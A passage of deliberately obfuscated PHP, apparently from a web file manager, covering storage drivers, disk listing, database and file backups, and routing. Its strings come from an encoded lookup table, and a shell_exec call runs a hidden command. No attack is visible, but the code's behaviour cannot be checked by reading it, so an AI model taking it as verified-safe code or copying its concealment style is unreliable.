(!$¾­ûÄáÕ) { $ËşãŒş = IO::infoFullSimple($İ™ÛÛª‘); if (!$ËşãŒş) { $¾­ûÄáÕ = IO::mkdir($İ™ÛÛª‘, REPEAT_SKIP); } else { $¾­ûÄáÕ = $ËşãŒş[$_SERVER[¼èá¯æÙ][97]]; } Cache::set($İ™ÛÛª‘, $¾­ûÄáÕ, 3600 * 10); } return $¾­ûÄáÕ; } public static function defaultDriver() { return Model($_SERVER[¼èá¯æÙ][849])->defaultDriver(); } public static function defaultIO() { $áÕû­ºÃ =& $_SERVER[¼èá¯æÙ]; $€ˆ¼çÊ = self::defaultDriver(); return $áÕû­ºÃ[1386] . $€ˆ¼çÊ[$áÕû­ºÃ[486]] . $áÕû­ºÃ[1374]; } public static function defaultDriverInit() { static $Üôû³¨£ = false; if ($Üôû³¨£) { return $Üôû³¨£; } $Üôû³¨£ = IO::init(self::defaultIO()); return $Üôû³¨£; } public static function fileTypeList() { $ø·˜ÃÜ =& $_SERVER[¼èá¯æÙ]; $Ïû½¡ª­ = $GLOBALS[$ø·˜ÃÜ[6]][$ø·˜ÃÜ[1387]]; foreach ($Ïû½¡ª­ as $ÓúÈäø™ => $©Å•åë”) { $ä‡³Õ¾¹ = $ø·˜ÃÜ[1388] . $ÓúÈäø™; $¼òÅ¡…² = LNG($ä‡³Õ¾¹); if ($ä‡³Õ¾¹ != $¼òÅ¡…²) { $Ïû½¡ª­[$ÓúÈäø™][$ø·˜ÃÜ[32]] = $¼òÅ¡…²; } } return $Ïû½¡ª­; } public static function diskList($¬ßİÓú° = true) { $»½–‘´£ = $_SERVER[¼èá¯æÙ][1389]; if ($¬ßİÓú°) { $Šƒ«šÓÀ = Cache::get($»½–‘´£); if (is_array($Šƒ«šÓÀ)) { return $Šƒ«šÓÀ; } } $Šƒ«šÓÀ = self::diskListGet(); Cache::set($»½–‘´£, $Šƒ«šÓÀ, 60); return $Šƒ«šÓÀ; } public static function diskListGet() { $„øùáÈ =& $_SERVER[¼èá¯æÙ]; $î ¥¹Çº = array(); if ($GLOBALS[$„øùáÈ[6]][$„øùáÈ[1390]] == $„øùáÈ[1391]) { $Ø ŞÈşÊ = $„øùáÈ[1392]; for ($÷·Ï—¡‡ = 0; $÷·Ï—¡‡ < strlen($Ø ŞÈşÊ); $÷·Ï—¡‡++) { $Úšªöê = $Ø ŞÈşÊ[$÷·Ï—¡‡] . $„øùáÈ[1393]; if (file_exists($Úšªöê)) { $î ¥¹Çº[] = $Úšªöê; } } return $î ¥¹Çº; } if (!function_exists($„øùáÈ[111])) { $î ¥¹Çº[] = $„øùáÈ[918]; return $î ¥¹Çº; } $­ã¨¨îæ = explode($„øùáÈ[59], shell_exec($„øùáÈ[1394])); array_shift($­ã¨¨îæ); array_pop($­ã¨¨îæ); $ãµáÌç = array($„øùáÈ[1395], $„øùáÈ[1396], $„øùáÈ[1397], $„øùáÈ[1398], $„øùáÈ[1399], $„øùáÈ[1400], $„øùáÈ[1401], $„øùáÈ[1402]); foreach ($­ã¨¨îæ as $¿Õ¼Å±ş) { $¦¨Ÿ˜¥’ = preg_split($„øùáÈ[1403], $¿Õ¼Å±ş); $Úšªöê = $¦¨Ÿ˜¥’[count($¦¨Ÿ˜¥’) - 1]; if (!strstr($¦¨Ÿ˜¥’[0], $„øùáÈ[1404]) || !$Úšªöê) { continue; } $êÂé±ëĞ = rtrim($Úšªöê, $„øùáÈ[8]) . $„øùáÈ[8]; if (in_array($êÂé±ëĞ, $ãµáÌç)) { continue; } $î ¥¹Çº[] = $êÂé±ëĞ; } return $î ¥¹Çº; } public static function isSameDisk($İç¬÷Ÿ°, $µ«Ş®¤ñ) { $®Ö½±íŞ =& $_SERVER[¼èá¯æÙ]; if ($GLOBALS[$®Ö½±íŞ[6]][$®Ö½±íŞ[1390]] == $®Ö½±íŞ[1391]) { return strtolower(substr($İç¬÷Ÿ°, 0, 1)) == strtolower(substr($µ«Ş®¤ñ, 0, 1)); } $œïÑ°Ş¦ = stat($İç¬÷Ÿ°); $Ó¾£æïÓ = stat($µ«Ş®¤ñ); if ($œïÑ°Ş¦ === !1 || $Ó¾£æïÓ === !1) { return !1; } return $œïÑ°Ş¦[$®Ö½±íŞ[1405]] === $Ó¾£æïÓ[$®Ö½±íŞ[1405]]; $¹Ğ¢‹  = self::diskList(); $Œù§âè­ = !1; $­ÙéÎ‰Ì = !1; sort($¹Ğ¢‹ ); $¹Ğ¢‹  = array_reverse($¹Ğ¢‹ ); $İç¬÷Ÿ° = rtrim($İç¬÷Ÿ°, $®Ö½±íŞ[8]) . $®Ö½±íŞ[8]; $µ«Ş®¤ñ = rtrim($µ«Ş®¤ñ, $®Ö½±íŞ[8]) . $®Ö½±íŞ[8]; foreach ($¹Ğ¢‹  as $‡ª÷‚øĞ) { $Œ¼ÄÇŠÁ = strlen($‡ª÷‚øĞ); if (!$Œù§âè­ && substr($İç¬÷Ÿ°, 0, $Œ¼ÄÇŠÁ) == $‡ª÷‚øĞ) { $Œù§âè­ = $‡ª÷‚øĞ; } if (!$­ÙéÎ‰Ì && substr($µ«Ş®¤ñ, 0, $Œ¼ÄÇŠÁ) == $‡ª÷‚øĞ) { $­ÙéÎ‰Ì = $‡ª÷‚øĞ; } if ($Œù§âè­ && $­ÙéÎ‰Ì) { break; } } return $Œù§âè­ === $­ÙéÎ‰Ì; } public static function transferType($âìŞöò, $äèöàâë) { $«Ö‚ü¹” =& $_SERVER[¼èá¯æÙ]; $ïÌœ ıŒ = self::driverType($âìŞöò); $»¨£´Ñ = self::driverType($äèöàâë); if ($ïÌœ ıŒ[$«Ö‚ü¹”[33]] == $»¨£´Ñ[$«Ö‚ü¹”[33]] && $ïÌœ ıŒ[$«Ö‚ü¹”[1406]] == $»¨£´Ñ[$«Ö‚ü¹”[1406]]) { return $«Ö‚ü¹”[1407]; } if ($ïÌœ ıŒ[$«Ö‚ü¹”[33]] == $«Ö‚ü¹”[952] && $»¨£´Ñ[$«Ö‚ü¹”[33]] == $«Ö‚ü¹”[119]) { return $«Ö‚ü¹”[1284]; } if ($ïÌœ ıŒ[$«Ö‚ü¹”[33]] == $«Ö‚ü¹”[119] && $»¨£´Ñ[$«Ö‚ü¹”[33]] == $«Ö‚ü¹”[952]) { return $«Ö‚ü¹”[120]; } return $«Ö‚ü¹”[1408]; } public static function driverType($Şç˜¾’) { $Â¿Ü¡«è =& $_SERVER[¼èá¯æÙ]; $êŒù“‹ = str_replace($Â¿Ü¡«è[1409], $Â¿Ü¡«è[12], strtolower($Şç˜¾’->getType())); if ($êŒù“‹ == $Â¿Ü¡«è[839] || $êŒù“‹ == $Â¿Ü¡«è[1410] || $êŒù“‹ == $Â¿Ü¡«è[1411]) { $Şç˜¾’ = self::defaultDriverInit(); } else { if ($êŒù“‹ == $Â¿Ü¡«è[1294] || $êŒù“‹ == $Â¿Ü¡«è[1412]) { $Şç˜¾’ = IO::init($Şç˜¾’->pathParse[$Â¿Ü¡«è[1237]]); } } $üç–¸ÂÇ = $Şç˜¾’->path; $êŒù“‹ = str_replace($Â¿Ü¡«è[1409], $Â¿Ü¡«è[12], strtolower($Şç˜¾’->getType())); if ($êŒù“‹ == $Â¿Ü¡«è[119]) { return array($Â¿Ü¡«è[33] => $Â¿Ü¡«è[119], $Â¿Ü¡«è[1406] => $Â¿Ü¡«è[12], $Â¿Ü¡«è[97] => $üç–¸ÂÇ, $Â¿Ü¡«è[108] => $Şç˜¾’); } return array($Â¿Ü¡«è[33] => $Â¿Ü¡«è[952], $Â¿Ü¡«è[1406] => $Şç˜¾’->pathDriver, $Â¿Ü¡«è[97] => $üç–¸ÂÇ, $Â¿Ü¡«è[108] => $Şç˜¾’); } public static function pathDriverType($èºÂ¡»æ) { return $èºÂ¡»æ ? self::driverType(IO::init($èºÂ¡»æ)) : !1; } public static function pathDriverLocal($ŸãÑêÙä) { $÷áş¾š› =& $_SERVER[¼èá¯æÙ]; $áÒŞ„Š = $ŸãÑêÙä ? self::driverType(IO::init($ŸãÑêÙä)) : !1; return strtolower($áÒŞ„Š[$÷áş¾š›[33]]) == $÷áş¾š›[119] ? !0 : !1; } public static function allowCover($Š€ÏğÄ, $áŸº‚õ = true) { $–’ÎÂ° =& $_SERVER[¼èá¯æÙ]; if (is_string($Š€ÏğÄ)) { $Š€ÏğÄ = IO::info($Š€ÏğÄ); } if (!$Š€ÏğÄ || $Š€ÏğÄ[$–’ÎÂ°[33]] == $–’ÎÂ°[88] || $Š€ÏğÄ[$–’ÎÂ°[89]] <= 100) { return !1; } if (isset($Š€ÏğÄ[$–’ÎÂ°[1413]]) || !$Š€ÏğÄ[$–’ÎÂ°[97]]) { return !1; } if (isset($Š€ÏğÄ[$–’ÎÂ°[244]]) && !$Š€ÏğÄ[$–’ÎÂ°[244]]) { return !1; } static $Ùò·ùõ„ = false; if (!$Ùò·ùõ„ || !$áŸº‚õ) { $²âÀ¦‡ = self::driverType(IO::init($Š€ÏğÄ[$–’ÎÂ°[97]])); $ÑËË·‘ş = $²âÀ¦‡[$–’ÎÂ°[108]]; $Ùò·ùõ„ = $–’ÎÂ°[206]; if ($²âÀ¦‡[$–’ÎÂ°[33]] == $–’ÎÂ°[119]) { $Ùò·ùõ„ = $–’ÎÂ°[1414]; } if ($²âÀ¦‡[$–’ÎÂ°[108]] && is_array($²âÀ¦‡[$–’ÎÂ°[108]]->config)) { $ã×âÁó = $²âÀ¦‡[$–’ÎÂ°[108]]->config; if (isset($ã×âÁó[$–’ÎÂ°[1415]]) && $ã×âÁó[$–’ÎÂ°[1415]]) { $Ùò·ùõ„ = $–’ÎÂ°[1414]; } } $ôĞ§†üÒ = KodIO::defaultDriver(); if (strtolower($ôĞ§†üÒ[$–’ÎÂ°[108]]) == $–’ÎÂ°[119] && is_array($ôĞ§†üÒ[$–’ÎÂ°[6]])) { $²•Øğ¸” = $ôĞ§†üÒ[$–’ÎÂ°[6]][$–’ÎÂ°[1267]]; if (substr($²•Øğ¸”, 0, 2) == $–’ÎÂ°[1416]) { $²•Øğ¸” = str_replace($–’ÎÂ°[1416], BASIC_PATH, $²•Øğ¸”); } $²•Øğ¸” = str_replace($–’ÎÂ°[266], $–’ÎÂ°[8], $²•Øğ¸”); if (substr($Š€ÏğÄ[$–’ÎÂ°[97]], 0, strlen($²•Øğ¸”)) == $²•Øğ¸”) { $Ùò·ùõ„ = $–’ÎÂ°[206]; } } } return $Ùò·ùõ„ == $–’ÎÂ°[1414] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($û®ÛŠåÄ) { parent::__construct($û®ÛŠåÄ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($ó•³‘†£) { $¸’»­ìœ =& $_SERVER[¼èá¯æÙ]; if (substr($ó•³‘†£, 0, 7) == $¸’»­ìœ[228]) { $ó•³‘†£ = $¸’»­ìœ[229] . substr($ó•³‘†£, 7); } header($¸’»­ìœ[185] . $ó•³‘†£); die; } } goto CµáãºÖ; Bóœ£ÀÓÈŞ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¼èá¯æÙ][830]); $this->init(); $this->keep(); } public function init() { $ŒÇí‡èÔ =& $_SERVER[¼èá¯æÙ]; $this->isManual(); self::$name = date($ŒÇí‡èÔ[831]); if (!($‘ÁÄßÌ = $this->model->lastItem())) { $‘ÁÄßÌ = $this->initData(); } else { self::$name = $‘ÁÄßÌ[$ŒÇí‡èÔ[32]]; if ($‘ÁÄßÌ[$ŒÇí‡èÔ[832]] == $ŒÇí‡èÔ[101]) { self::$name = date($ŒÇí‡èÔ[271]); $…èŸŒ‚è = intval(_get($‘ÁÄßÌ, $ŒÇí‡èÔ[833], 0)); if (self::$manual == 0 && $‘ÁÄßÌ[$ŒÇí‡èÔ[32]] == self::$name) { $this->model->remove($‘ÁÄßÌ[$ŒÇí‡èÔ[486]]); } $‘ÁÄßÌ = $this->initData($…èŸŒ‚è, $‘ÁÄßÌ[$ŒÇí‡èÔ[834]]); } else { $this->checkStore($‘ÁÄßÌ[$ŒÇí‡èÔ[834]]); } } self::$option = $‘ÁÄßÌ; } private function isManual() { $Ü­¸Áª” = _get($GLOBALS, $_SERVER[¼èá¯æÙ][835], 0); $Ü­¸Áª” = intval($Ü­¸Áª”); self::$manual = $Ü­¸Áª” && $Ü­¸Áª” == 1 ? 1 : 0; } private function initData($®¼¬óï = 0, $ğãÅ½ˆ = '') { $ÂüûÚªú =& $_SERVER[¼èá¯æÙ]; $òÏ÷à›ê = $this->model->config(); if ($ğãÅ½ˆ && $òÏ÷à›ê[$ÂüûÚªú[834]] != $ğãÅ½ˆ) { $®¼¬óï = 0; } $this->checkStore($òÏ÷à›ê[$ÂüûÚªú[834]]); if (self::$manual == 1) { self::$name .= $ÂüûÚªú[11] . date($ÂüûÚªú[836]); } $¢Õ¦á» = array($ÂüûÚªú[834] => $òÏ÷à›ê[$ÂüûÚªú[834]], $ÂüûÚªú[32] => self::$name, $ÂüûÚªú[832] => 0, $ÂüûÚªú[181] => $òÏ÷à›ê[$ÂüûÚªú[181]], $ÂüûÚªú[837] => self::$manual, $ÂüûÚªú[380] => array($ÂüûÚªú[838] => array($ÂüûÚªú[832] => 0), $ÂüûÚªú[839] => array($ÂüûÚªú[832] => 0, $ÂüûÚªú[840] => 0, $ÂüûÚªú[841] => 0, $ÂüûÚªú[33] => $ÂüûÚªú[12], $ÂüûÚªú[842] => 0, $ÂüûÚªú[843] => 0), $ÂüûÚªú[844] => array($ÂüûÚªú[832] => 0, $ÂüûÚªú[840] => 0, $ÂüûÚªú[841] => 0, $ÂüûÚªú[842] => 0, $ÂüûÚªú[843] => 0), $ÂüûÚªú[242] => array($ÂüûÚªú[832] => 0, $ÂüûÚªú[845] => 0, $ÂüûÚªú[846] => 0, $ÂüûÚªú[847] => 0, $ÂüûÚªú[848] => 0, $ÂüûÚªú[552] => $®¼¬óï, $ÂüûÚªú[842] => 0, $ÂüûÚªú[843] => 0)), $ÂüûÚªú[842] => time(), $ÂüûÚªú[843] => 0); $Ë‡ò¯ø = $this->model->insert($¢Õ¦á»); $¢Õ¦á»[$ÂüûÚªú[486]] = $Ë‡ò¯ø; return $¢Õ¦á»; } private function checkStore($ê™î‚™Ù) { $Ş¾¢Š›… = Model($_SERVER[¼èá¯æÙ][849]); $¶¹ä¬©û = $Ş¾¢Š›…->listData($ê™î‚™Ù); $Ş¾¢Š›…->checkConfig($¶¹ä¬©û); } public static function get() { if (!self::$option) { $Š”‚êêç = Model($_SERVER[¼èá¯æÙ][830]); $£õ³–³å = $Š”‚êêç->findByName(self::$name); $Š”‚êêç->parseContent($£õ³–³å); self::$option = $£õ³–³å; } return self::$option; } public static function set($Ğ›Ãó˜Å) { $ª´”Ì =& $_SERVER[¼èá¯æÙ]; $¥¬üøöà = self::get(); foreach ($Ğ›Ãó˜Å as $ú‚Ş«ûÓ => $ı£¨Òœ) { array_set_value($¥¬üøöà, $ú‚Ş«ûÓ, $ı£¨Òœ); } Model($ª´”Ì[830])->update($¥¬üøöà[$ª´”Ì[486]], $¥¬üøöà); self::$option = $¥¬üøöà; return self::$option; } public function keep() { $ÉãáîÜä =& $_SERVER[¼èá¯æÙ]; $§ïñµÀ­ = self::get(); if (_get($§ïñµÀ­, $ÉãáîÜä[850], 0) == $ÉãáîÜä[101]) { return; } $this->backupKeep($§ïñµÀ­); self::set(array($ÉãáîÜä[850] => 1)); } private function backupKeep($™øÀ‹³û) { $…œ€Î¯© =& $_SERVER[¼èá¯æÙ]; if (self::$manual == 1) { return; } $Èµ¼Çø‹ = $this->model->listData(); if (empty($Èµ¼Çø‹)) { return; } $Ô®Ûû·ù = 0; $ÓËè³Û’ = array(); foreach ($Èµ¼Çø‹ as $ö¦Ùİ•î) { if ($Ô®Ûû·ù >= 7) { break; } $ÓËè³Û’[] = $ö¦Ùİ•î[$…œ€Î¯©[32]]; $Ô®Ûû·ù++; } for ($Ô®Ûû·ù = 0; $Ô®Ûû·ù < 12; $Ô®Ûû·ù++) { $ÓËè³Û’[] = date($…œ€Î¯©[851], strtotime("\55{$Ô®Ûû·ù}\40\x6d\157\x6e\x74\150\x73")); } $ÓËè³Û’ = array_unique($ÓËè³Û’); $³ûÉæ = Model($…œ€Î¯©[852])->get($…œ€Î¯©[853]); foreach ($Èµ¼Çø‹ as $ö¦Ùİ•î) { if (isset($ö¦Ùİ•î[$…œ€Î¯©[837]]) && $ö¦Ùİ•î[$…œ€Î¯©[837]] == $…œ€Î¯©[101]) { continue; } if (!empty($ö¦Ùİ•î[$…œ€Î¯©[32]]) && in_array($ö¦Ùİ•î[$…œ€Î¯©[32]], $ÓËè³Û’)) { continue; } $this->model->remove($ö¦Ùİ•î[$…œ€Î¯©[486]]); $­ßŒ°ÌÚ = $this->backupPath($™øÀ‹³û, $³ûÉæ); IO::remove($­ßŒ°ÌÚ, !1); } } private function backupPath($Ÿ‚´½£É, $¸Î™ÀÌÊ = false) { $˜Èòì÷õ =& $_SERVER[¼èá¯æÙ]; if (!$¸Î™ÀÌÊ) { $¸Î™ÀÌÊ = Model($˜Èòì÷õ[852])->get($˜Èòì÷õ[853]); } $ì¤ÖëâÓ = $Ÿ‚´½£É[$˜Èòì÷õ[32]]; $ŒÎ¿íÀÂ = substr(md5($˜Èòì÷õ[854] . $¸Î™ÀÌÊ . $ì¤ÖëâÓ), 0, 8); return "\173\151\157\72{$Ÿ‚´½£É[$˜Èòì÷õ[834]]}\175\57\x64\x61\164\141\x62\x61\163\145\x2f\142\141\143\153\165\x70\57" . $ì¤ÖëâÓ . $˜Èòì÷õ[11] . $ŒÎ¿íÀÂ; } public function db() { $Ö©Ë©µÊ =& $_SERVER[¼èá¯æÙ]; $ó¡½¬Œ¡ = self::get(); if (_get($ó¡½¬Œ¡, $Ö©Ë©µÊ[855], 0) == $Ö©Ë©µÊ[101]) { return !0; } $çÌÛ ¦¼ = new BackupDb(); if (!$çÌÛ ¦¼->index()) { return !1; } self::set(array($Ö©Ë©µÊ[855] => 1)); return !0; } public function dbFile() { $ôùŞß°ä =& $_SERVER[¼èá¯æÙ]; $Íóäş¿Ï = self::get(); if (_get($Íóäş¿Ï, $ôùŞß°ä[856], 0) == $ôùŞß°ä[101]) { return !0; } $×£Á¹øÖ = new BackupDbFile(); if (!$×£Á¹øÖ->index()) { return !1; } self::set(array($ôùŞß°ä[856] => 1)); return !0; } public function file() { $œ©¤Ê—™ =& $_SERVER[¼èá¯æÙ]; $«ÙÌÏÅ‰ = self::get(); if (_get($«ÙÌÏÅ‰, $œ©¤Ê—™[857], 0) == $œ©¤Ê—™[101]) { return !0; } if ($«ÙÌÏÅ‰[$œ©¤Ê—™[181]] == $œ©¤Ê—™[858]) { $ô¡üÑ…ƒ = new BackupFile(); if (!$ô¡üÑ…ƒ->index()) { return !1; } } self::set(array($œ©¤Ê—™[857] => 1, $œ©¤Ê—™[832] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ë„«»íà =& $_SERVER[¼èá¯æÙ]; $Æ®°Ì¨ = Backup::get(); self::$io = $Æ®°Ì¨[$ë„«»íà[834]]; self::$name = $Æ®°Ì¨[$ë„«»íà[32]]; $‡îÃçã = new DbManage(); $æóìèé = $‡îÃçã->dbType(); $ë¢·ˆ¾‰ = array($ë„«»íà[859] => $æóìèé, $ë„«»íà[860] => time()); Backup::set($ë¢·ˆ¾‰); $öÃïêÇğ = $this->tmpFilesPath() . $ë„«»íà[861] . self::$name . $ë„«»íà[8]; del_dir($öÃïêÇğ); mk_dir($öÃïêÇğ); $›¯ŸÇ¹ = $¾¸½¢§ = 0; try { $”¦¡Óè“ = $‡îÃçã->db()->getTables(); } catch (Exception $İÃØÑİñ) { return !1; } $”¦¡Óè“ = array_diff($”¦¡Óè“, array($ë„«»íà[862], $ë„«»íà[863])); foreach ($”¦¡Óè“ as $€Éı˜ƒ) { if ($€Éı˜ƒ == $ë„«»íà[864]) { continue; } $›¯ŸÇ¹ += $‡îÃçã->model($€Éı˜ƒ)->count(); } $³£˜Æ³´ = new Task($ë„«»íà[865], $ë„«»íà[866], $›¯ŸÇ¹, LNG($ë„«»íà[867]) . $ë„«»íà[868] . LNG($ë„«»íà[869])); $GLOBALS[$ë„«»íà[870]] = self::$name; foreach ($”¦¡Óè“ as $€Éı˜ƒ) { $µë»ıùÅ = $öÃïêÇğ . $€Éı˜ƒ . $ë„«»íà[871]; if ($€Éı˜ƒ == $ë„«»íà[864]) { @touch($µë»ıùÅ); continue; } $éïÔôßƒ = null; if ($€Éı˜ƒ == $ë„«»íà[872] && $Æ®°Ì¨[$ë„«»íà[181]] == $ë„«»íà[858]) { $éïÔôßƒ = self::$io; } $¾¸½¢§ += $‡îÃçã->sqlFromDb($€Éı˜ƒ, $µë»ıùÅ, $³£˜Æ³´, $éïÔôßƒ); } unset($GLOBALS[$ë„«»íà[870]]); $³£˜Æ³´->end(); if ($¾¸½¢§ > $›¯ŸÇ¹) { $›¯ŸÇ¹ = $¾¸½¢§; } $ë¢·ˆ¾‰ = array($ë„«»íà[859] => $æóìèé, $ë„«»íà[855] => 1, $ë„«»íà[873] => $›¯ŸÇ¹, $ë„«»íà[874] => $¾¸½¢§, $ë„«»íà[875] => time()); Backup::set($ë¢·ˆ¾‰); if ($›¯ŸÇ¹ - $¾¸½¢§ > 0) { $Ãü²¢åİ = $ë„«»íà[876]; if (!stristr(I18n::getType(), $ë„«»íà[877])) { $Ãü²¢åİ = $ë„«»íà[878]; } write_log(array($Ãü²¢åİ, $ë¢·ˆ¾‰), $ë„«»íà[866]); return !1; } return !0; } private function tmpFilesPath() { $Ú¯›Æ¯å =& $_SERVER[¼èá¯æÙ]; $¾Ğß—æ = TEMP_FILES; if ($GLOBALS[$Ú¯›Æ¯å[6]][$Ú¯›Æ¯å[102]][$Ú¯›Æ¯å[879]]) { $¾Ğß—æ = $GLOBALS[$Ú¯›Æ¯å[6]][$Ú¯›Æ¯å[102]][$Ú¯›Æ¯å[879]]; if (!mk_dir($¾Ğß—æ) || !is_writable($¾Ğß—æ) || !IO::mkfile($¾Ğß—æ . $Ú¯›Æ¯å[880])) { $¾Ğß—æ = TEMP_FILES; } } return $¾Ğß—æ; } } class BackupDbFile { public function __construct() { } public function index() { $¼†³¿Ä˜ =& $_SERVER[¼èá¯æÙ]; $è±£ = Backup::get(); $– ö‰ÔŸ = $è±£[$¼†³¿Ä˜[32]]; $úğŞÒè = $this->tmpFilesPath() . "\142\141\143\153\165\160\137{$– ö‰ÔŸ}\57"; $Ï›ºÃøÁ = $this->backupPath($è±£); if (!($Ï›ºÃøÁ = IO::mkdir($Ï›ºÃøÁ))) { return !1; } $ìƒô–’ = IO::listPath($úğŞÒè); $‡ËÉôüÔ = isset($ìƒô–’[$¼†³¿Ä˜[96]]) ? $ìƒô–’[$¼†³¿Ä˜[96]] : array(); $ª£ÕŒÊş = array_sum(array_column($‡ËÉôüÔ, $¼†³¿Ä˜[89])); if (!$ª£ÕŒÊş) { return !1; } $†èñÆò = array($¼†³¿Ä˜[881] => $ª£ÕŒÊş, $¼†³¿Ä˜[882] => time()); Backup::set($†èñÆò); $ í”–Éú = new TaskFileTransfer($¼†³¿Ä˜[883], $¼†³¿Ä˜[866], count($‡ËÉôüÔ), LNG($¼†³¿Ä˜[867]) . $¼†³¿Ä˜[473] . LNG($¼†³¿Ä˜[869]) . $¼†³¿Ä˜[884]); $ í”–Éú->task[$¼†³¿Ä˜[845]] = $ª£ÕŒÊş; foreach ($ìƒô–’[$¼†³¿Ä˜[96]] as $»ğÖ”Şò) { $èÑİÖß× = IO::move($»ğÖ”Şò[$¼†³¿Ä˜[97]], $Ï›ºÃøÁ); if (!$èÑİÖß×) { $ í”–Éú->end(); $‚€‹‡òü = IO::getLastError($¼†³¿Ä˜[885] . $»ğÖ”Şò[$¼†³¿Ä˜[97]] . $¼†³¿Ä˜[886] . $Ï›ºÃøÁ . $¼†³¿Ä˜[188]); write_log($‚€‹‡òü, $¼†³¿Ä˜[866]); return !1; } } $ı©—ÖÖ„ = new DbManage(); $ş¡Ìİ„İ = $ı©—ÖÖ„->getSqlFile(); if (!$ş¡Ìİ„İ[$¼†³¿Ä˜[887]] || !$ş¡Ìİ„İ[$¼†³¿Ä˜[13]]) { return !1; } IO::move($ş¡Ìİ„İ[$¼†³¿Ä˜[887]], $Ï›ºÃøÁ); IO::move($ş¡Ìİ„İ[$¼†³¿Ä˜[13]], $Ï›ºÃøÁ); $ í”–Éú->end(); $†èñÆò = array($¼†³¿Ä˜[888] => $ª£ÕŒÊş, $¼†³¿Ä˜[889] => time()); Backup::set($†èñÆò); return !0; } private function backupPath($¥¸·Øµ–) { $Ş¡§İ±“ =& $_SERVER[¼èá¯æÙ]; $¡«‡ƒ§ = $¥¸·Øµ–[$Ş¡§İ±“[32]]; $£Í¹¶¹ = Model($Ş¡§İ±“[852])->get($Ş¡§İ±“[853]); $çİ§À®ß = substr(md5($Ş¡§İ±“[854] . $£Í¹¶¹ . $¡«‡ƒ§), 0, 8); return "\x7b\x69\157\x3a{$¥¸·Øµ–[$Ş¡§İ±“[834]]}\x7d\57\x64\141\x74\141\142\x61\x73\x65\57\x62\141\x63\x6b\x75\160\57" . $¡«‡ƒ§ . $Ş¡§İ±“[11] . $çİ§À®ß; } private function tmpFilesPath() { $¸¦ƒ­Å“ =& $_SERVER[¼èá¯æÙ]; $ÒÅŒËğ¾ = TEMP_FILES; if ($GLOBALS[$¸¦ƒ­Å“[6]][$¸¦ƒ­Å“[102]][$¸¦ƒ­Å“[879]]) { $ÒÅŒËğ¾ = $GLOBALS[$¸¦ƒ­Å“[6]][$¸¦ƒ­Å“[102]][$¸¦ƒ­Å“[879]]; if (!mk_dir($ÒÅŒËğ¾) || !is_writable($ÒÅŒËğ¾) || !IO::mkfile($ÒÅŒËğ¾ . $¸¦ƒ­Å“[880])) { $ÒÅŒËğ¾ = TEMP_FILES; } } return $ÒÅŒËğ¾; } } goto cæé¥ŞâŒÅ; e¡É§è§’: $_SERVER[üŸĞÁÆÁ] = explode($_SERVER[¼èá¯æÙ][694], gzinflate(substr($_SERVER[¼èá¯æÙ][695], 10, -8))); $ehcdsriujt = $_SERVER[¼èá¯æÙ][696]; class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\x6e\144\x65\170"; function __construct() { } public function setDefault($“ƒ½—§ä) { $Ì´é¦‰ =& $_SERVER[¼èá¯æÙ]; $í›Í©À =& $_SERVER[üŸĞÁÆÁ]; $šğ¤üŞ© = explode($í›Í©À[0], trim($“ƒ½—§ä, $í›Í©À[0])); $¾Ê‰›Ó = $Ì´é¦‰[697]; while (strlen($¾Ê‰›Ó) < $Ì´é¦‰[698]) { if (!$¾Ê‰›Ó) { break; } $¾Ê‰›Ó++; } $this->defaultModule = $šğ¤üŞ©[0] ? $šğ¤üŞ©[0] : $this->defaultModule; $this->defaultController = $šğ¤üŞ©[1] ? $šğ¤üŞ©[1] : $this->defaultController; $‘ØôµÎñ = $Ì´é¦‰[699]; while (strlen($‘ØôµÎñ) < $Ì´é¦‰[60]) { if (!$‘ØôµÎñ) { break; } $‘ØôµÎñ++; } $this->defaultAction = $šğ¤üŞ©[2] ? $šğ¤üŞ©[2] : $this->defaultAction; $this->oaeu15b3d07d($í›Í©À[1], array($this, $í›Í©À[2])); $ÁÀ”¨Ë = $Ì´é¦‰[700]; while (strlen($ÁÀ”¨Ë) < $Ì´é¦‰[701]) { if (!$ÁÀ”¨Ë) { break; } $ÁÀ”¨Ë++; } } public function appRun($åÔåĞ¶ı) { $›˜Ú¸á« =& $_SERVER[¼èá¯æÙ]; $¼½ÉÓê‡ =& $_SERVER[üŸĞÁÆÁ]; $Á÷çºÌÉ = explode($¼½ÉÓê‡[0], $åÔåĞ¶ı); $—¹öê´Å = $›˜Ú¸á«[702]; if (!$—¹öê´Å) { die; } $»µ¿–Şš = strtolower($Á÷çºÌÉ[0]); $åò¥‚êú = $¼½ÉÓê‡[3]; $µÓÅÛ„· = $›˜Ú¸á«[703]; if ($»µ¿–Şš == $¼½ÉÓê‡[4]) { $åò¥‚êú = $¼½ÉÓê‡[5]; $Á÷çºÌÉ[0] = $¼½ÉÓê‡[6]; $Á÷çºÌÉ[1] = $Á÷çºÌÉ[1] . $¼½ÉÓê‡[7]; $åÔåĞ¶ı = join($¼½ÉÓê‡[0], $Á÷çºÌÉ); $åÔåĞ¶ı = trim($åÔåĞ¶ı, $¼½ÉÓê‡[0]); } call_user_func(array($¼½ÉÓê‡[8], $¼½ÉÓê‡[9]), $åò¥‚êú . $¼½ÉÓê‡[10], $åÔåĞ¶ı); ActionCall($åÔåĞ¶ı); $•‰¶è› = $›˜Ú¸á«[704]; if (!$•‰¶è›) { die; } call_user_func(array($¼½ÉÓê‡[8], $¼½ÉÓê‡[9]), $åò¥‚êú . $¼½ÉÓê‡[11], $åÔåĞ¶ı); } private function autorun() { $ÌËØùØé =& $_SERVER[¼èá¯æÙ]; $ĞŒêßçŞ =& $_SERVER[üŸĞÁÆÁ]; global $config; $×’¨ÜüÈ = $ÌËØùØé[705]; while (strlen($×’¨ÜüÈ) < $ÌËØùØé[706]) { if (!$×’¨ÜüÈ) { break; } $×’¨ÜüÈ++; } if (count($config[$ĞŒêßçŞ[12]]) == 0) { return; } foreach ($config[$ĞŒêßçŞ[12]] as $×’Í§Âï => $¨«¡Øíœ) { $this->appRun($¨«¡Øíœ); } } private function suwtb7aa227b() { $Íò¢™é =& $_SERVER[¼èá¯æÙ]; $ºãÜ¢Ä =& $_SERVER[üŸĞÁÆÁ]; $úç€½’ = 